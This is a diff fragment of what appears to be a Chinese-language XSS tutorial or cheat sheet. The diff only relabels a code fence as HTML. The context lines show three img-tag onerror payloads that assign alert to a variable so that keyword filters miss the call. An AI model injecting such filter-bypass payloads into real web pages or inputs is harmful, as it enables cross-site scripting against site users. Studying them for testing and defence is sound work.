@@ -149,7 +149,7 @@
   
   
   通过赋值，也是我们常见的，看个例子：
-  ```
+  ```html
   <img src=x onerror=_=alert,_(/xss/) >
   <img src=x onerror=_=alert;_(/xss/) >
   <img src=x onerror=_=alert;x=1;_(/xss/) >
